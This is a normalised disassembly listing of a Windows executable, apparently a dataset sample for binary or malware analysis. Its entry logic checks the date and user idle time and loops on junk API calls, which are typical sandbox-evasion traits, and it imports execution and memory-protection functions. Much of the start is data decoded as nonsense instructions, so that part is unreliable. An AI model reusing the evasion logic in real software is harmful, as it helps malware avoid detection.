mov ebx 0x8b0c
jmp r-xdata
call EndMenu
dec ebx
jne r-xdata
nop
xor ebx ebx
xor edi edi
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
mov [ esi ] 0x8
push esi
call GetLastInputInfo
call GetTickCount
sub eax [ esi + 0x4 ]
cmp eax 0x82
jae r-xdata
nop
nop
jmp r-xdata
cmp ebx 0x11
jle r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
call EndMenu
call sub_48b944
jmp r-xdata
nop
nop
mov edi [ esi + 0x4 ]
inc ebx
call EndMenu
sub_48bc24
popad
add [ eax ] al
add [ esp + edi * 4 ] ch
dec eax
add [ ecx ] dh
inc eax
add [ ecx ] al
inc eax
add [ eax ] ch
pop edi
inc eax
add ah dl
pop esi
inc eax
add al dh
popad
inc eax
add al al
popad
inc eax
add al bh
outsb
inc eax
add al cl
outsb
inc eax
add [ eax ] dh
outsd
inc eax
add [ eax ] al
outsd
inc eax
add [ ecx + ebx * 2 + 0x41 ] dh
add [ ecx + ebx * 2 + 0x41 ] al
add [ eax + 0x72 ] ah
inc eax
add [ eax ] dh
jb r-xdata
add [ edx + eax * 8 + 0x42 ] dh
add [ edx + eax * 8 ] dh
inc edx
add [ edx + esi * 4 ] bh
inc edx
add [ edx + esi * 4 ] cl
inc edx
add [ edx + ebp * 4 - 0x5573ffbe ] bh
inc edx
add [ ecx + ebp + 0x297c0042 ] ch
inc edx
add [ eax ] bl
mov al [ 0xffffffff9f440042 ]
inc edx
add [ esi + ebx * 8 + 0x45 ] ch
add [ esi + ebx * 8 ] bh
inc ebp
add [ edx + esi * 4 + 0x42 ] bh
add [ edx + esi * 4 + 0x42 ] cl
add [ eax ] ch
inc esp
inc esi
add [ eax - 0x4bffb9bd ] bh
mov [ edx ] sub_42c784
pop esp
rol [ edx ] 0x1
or cl dl
inc edx
add al al
rol [ edx ] cl
nop
rol [ edx ] cl
mov dl dl
inc edx
add [ eax - 0x2e ] bl
inc edx
add [ eax - 0x2e ] dl
inc edx
add [ eax ] ah
rol [ edx ] cl
sbb dl dl
inc edx
add al ch
rol [ edx ] 0x1
sub al 0xd3
inc edx
add ah bh
rol [ edx ] cl
sbb al 0x11
inc ebx
add ah ch
adc [ ebx ] al
test [ edx - 0x6dabffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d83ffbe ] ch
inc edx
add al dh
retn 0x42
add [ ebx + ebx * 8 ] al
inc eax
add [ ecx + ebx * 8 - 0x1c8fffc0 ] al
inc eax
add [ eax - 0x1d ] al
inc eax
add [ eax + 0x18004149 ] dl
dec ecx
inc ecx
add [ ebx + ecx * 2 + 0x41 ] ch
add [ ebx + ecx * 2 ] bh
inc ecx
add [ ecx + ebx * 2 ] bl
inc ecx
add ah cl
pop eax
inc ecx
add [ eax + 0x26 ] cl
inc edx
add [ eax + 0x54004225 ] bl
mov eax [ 0xffffffffa1240042 ]
inc edx
add [ esp ] cl
inc edx
add ah bl
mov [ 0xffffffffc2740042 ] eax
inc edx
sub_48bd5a
inc edx
add al ah
rol [ edx ] 0x1
mov al 0xd1
inc edx
add [ eax + 0x780042d1 ] ch
rol [ edx ] 0x1
lodsb [ esi ]
inc edx
add [ ebx + esi * 8 + 0x42 ] ah
add [ esp + esi * 8 ] dl
inc edx
add ah cl
inc edx
add ah ch
inc edx
add [ edx + esi * 8 - 0xcbbffbe ] dh
inc edx
add [ ebx + esi * 8 ] dl
inc edx
add [ edx + esi * 8 ] dl
inc edx
add ah ah
int1
inc edx
add [ ecx + esi * 8 - 0xeafffbe ] cl
inc edx
add ah ch
xchg ebx eax
inc esp
add [ ebx + edx * 4 - 0xb7fffbc ] bh
inc edx
add [ eax ] dh
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_48bc24
call sub_4060c0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46f374
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46f38c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46f40c
call sub_403f38
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405a18
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405a2c
sub_401244
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40125c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40129c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_4012bc
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012dc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401324
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40132c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40133c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ae2
jmp sub_403a2c
sub_401ae9
mov al [ rw-data ]
pop ebp
retn
sub_401bc6
jmp sub_403a2c
sub_401c94
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022a8
retn
sub_402294
jmp sub_403a2c
sub_40243a
jmp sub_403a2c
sub_4026d9
jmp sub_403a2c
sub_40279c
call sub_406074
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406074
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027f0
mov [ rw-data ] edx
call sub_404010
sub_402854
push eax
push edx
push ecx
call sub_406074
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402848
retn
sub_402870
retn
sub_4028c4
retn
sub_4028c8
push ebx
call sub_406074
mov ebx [ eax + 0x4 ]
call sub_406074
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a80
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a90
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b50
mov edx [ eax + 0x1c ]
call sub_402b08
retn
sub_402db8
mov ecx 0xff
call sub_402dc4
retn
sub_402de8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402e04
jmp sub_402e04
sub_402e01
retn
sub_403081
iretd
sub_403191
jmp sub_403a2c
sub_4031e4
fninit
fwait
fldcw [ rw-data ]
retn
sub_40323c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403248
push ebx
mov ebx eax
mov eax ebx
call sub_403278
call sub_4026ec
mov edx eax
mov eax ebx
call sub_4032bc
pop ebx
retn
sub_403264
push ebx
mov ebx eax
mov eax ebx
call sub_403314
mov eax ebx
call sub_40270c
pop ebx
retn
sub_403278
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4032a0
call sub_403664
test dl dl
jle r-xdata
retn
call sub_40364c
sub_403360
retn
sub_4033e8
jmp sub_403a2c
sub_4033ef
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034e0
mov eax 0x8000ffff
retn
sub_4034e8
retn
sub_4034ec
retn
sub_4034f0
retn
sub_403625
jmp sub_403778
sub_40362a
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a8c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40364c
sub_40364c
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403654
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403664
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403674
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_40373c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403758
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403b25
retn
sub_403c68
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403cf6
jmp sub_403778
sub_403d56
jmp sub_403778
sub_403d70
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c68
mov [ rw-data ] 0x0
call sub_403d10
retn
sub_403ea9
retn
sub_40400b
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404010
mov [ rw-data ] eax
call sub_403f38
sub_4040a4
push eax
call ExitThread
sub_4042d0
retn
sub_40430c
retn
sub_40431a
retn
sub_404333
retn
sub_404344
retn
sub_40442b
retn
sub_40455c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404578#2
jmp sub_404578
sub_4045c1
retn
j_sub_404578
jmp sub_404578
sub_4045c9
retn
sub_40460b
retn
sub_404790
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
sub_4047a8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404900
retn
sub_404912
retn
sub_404914
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404b3c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404c40
mov ecx 0x1
jmp sub_404b54
sub_404c4a
retn
sub_404c4c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402848
call [ rw-data ]
retn
sub_404e72
retn
sub_404e74
mov al 0x11
jmp sub_402848
sub_404e9f
retn
sub_4050e0
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404d80
pop ebp
retn 0x4
j_sub_404b54
jmp sub_404b54
sub_4050f5
retn
sub_4050f8
call sub_405298
retn
sub_405324
call sub_4052fc
retn
sub_40566d
jmp sub_403a2c
sub_4057d8
call sub_4057e8
retn
sub_4057e0
call sub_405808
retn
sub_4057e8
push ebx
mov ebx eax
mov eax 0x8
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4058a3
jmp sub_403778
sub_4058c4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_405938
jmp sub_403a2c
sub_40593f
pop ecx
pop ebp
retn
sub_4059b8
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4059c4
add eax 0x4
push eax
call sub_401324
retn
sub_4059d0
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402848
sub_4059e0
call sub_403248
mov [ eax + 0x4 ] 0x1
retn
sub_405a18
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40131c
pop ebp
retn 0x4
sub_405d07
jmp sub_403a2c
sub_405d0e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405dab
jmp sub_403a2c
sub_405db2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405dfb
jmp sub_403a2c
sub_405e02
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405ec6
jmp sub_403a2c
sub_405ecd
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405f1e
jmp sub_403a2c
sub_405f25
pop ebp
retn
sub_405ffc
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_40601c
push eax
push 0x40
call LocalAlloc
retn
sub_406028
mov eax 0x10
retn
sub_4060b4
mov eax rw-data
call sub_4058c4
retn
sub_406129
jmp sub_403a2c
sub_406130
pop ebp
retn
sub_406134
sub [ rw-data ] 0x1
retn
sub_40613c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_406158
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406160
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_4061e5
jmp sub_403a2c
sub_4061ec
pop ebp
retn
sub_4061f0
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetExitCodeThread
jmp [ __import_lookup_table_6(kernel32:GetExitCodeThread) ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ __import_lookup_table_6(kernel32:GetTempPathA) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SetThreadPriority
jmp [ SetThreadPriority@IAT ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_4064f4
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SuspendThread
jmp [ __import_lookup_table_6(kernel32:SuspendThread) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ WinExec@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ __import_lookup_table_8(gdi32:SetViewportOrgEx) ]
SetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:SetWindowOrgEx) ]
UnrealizeObject
jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ChildWindowFromPoint
jmp [ __import_lookup_table_9(user32:ChildWindowFromPoint) ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMDIWindowA
jmp [ CreateMDIWindowA@IAT ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ DeferWindowPos@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ __import_lookup_table_9(user32:EndDeferWindowPos) ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ __import_lookup_table_9(user32:GetKeyboardLayoutList) ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetLastInputInfo
jmp [ GetLastInputInfo@IAT ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ GetScrollInfo@IAT ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ GetSysColor@IAT ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ __import_lookup_table_9(user32:KillTimer) ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ __import_lookup_table_9(user32:MsgWaitForMultipleObjects) ]
OemToCharA
jmp [ OemToCharA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ __import_lookup_table_9(user32:RegisterClassA) ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollRange
jmp [ SetScrollRange@IAT ]
SetTimer
jmp [ SetTimer@IAT ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406c70
shr eax 0x10
retn
sub_406c74
movzx eax ax
shr eax 0x8
retn
sub_406c7c
call GetTickCount
retn
sub_406c84
